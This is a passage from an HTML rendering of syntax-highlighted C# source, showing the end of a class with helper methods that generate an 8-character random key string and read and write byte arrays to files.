            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">RandomKey</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZMaDeByfReeOn"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Ticks</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">[</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">writeBytes</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">arrBytes</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Create</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">bw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">fsw</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">arrBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">bw</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">arrBytes</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">bw</span><span class="sc10">.</span><span class="sc11">Flush</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">bw</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fsw</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">readBytes</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">br</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">fw</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">fw</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">b</span><span class="sc10">[</span><span class="sc11">f</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">br</span><span class="sc10">.</span><span class="sc11">ReadByte</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">br</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fw</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
